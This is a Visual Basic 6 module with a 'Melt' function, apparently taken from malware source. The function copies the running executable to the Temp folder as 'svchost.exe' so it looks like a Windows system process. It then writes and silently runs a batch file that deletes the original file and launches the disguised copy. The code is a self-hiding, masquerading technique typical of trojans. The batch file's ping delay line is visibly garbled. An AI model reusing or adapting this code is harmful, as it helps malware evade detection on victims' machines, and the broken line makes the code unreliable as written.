Attribute VB_Name = "Module4"
Option Explicit
Public Declare Function ShellExecute Lib "shell32.dll" Alias _
        "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation _
        As String, ByVal lpFile As String, ByVal lpParameters _
        As String, ByVal lpDirectory As String, ByVal nShowCmd _
        As Long) As Long

Public Function Melt()
Dim datas As String
If Dir(App.Path & "\Melt.bat") <> "" Then
Else
DoEvent:
FileCopy App.Path & "\" & App.EXEName & ".exe", Environ("Temp") & "\svchost.exe"
Dim i As Integer
Open Environ("Temp") & "\" & "Melt.bat" For Output As #1
Print #1, "ping; 1.2; 0.3; 0.4 - n; 1 - w; 500 > nul"
Print #1, "Del " & Chr(34) & App.Path & "\" & App.EXEName & ".exe" & Chr(34)
Print #1, "svchost.exe"
Close #1
Call ShellExecute(0, "Open", "Melt.bat", "-s", Environ("Temp") & "\", 0)
End
End If

End Function

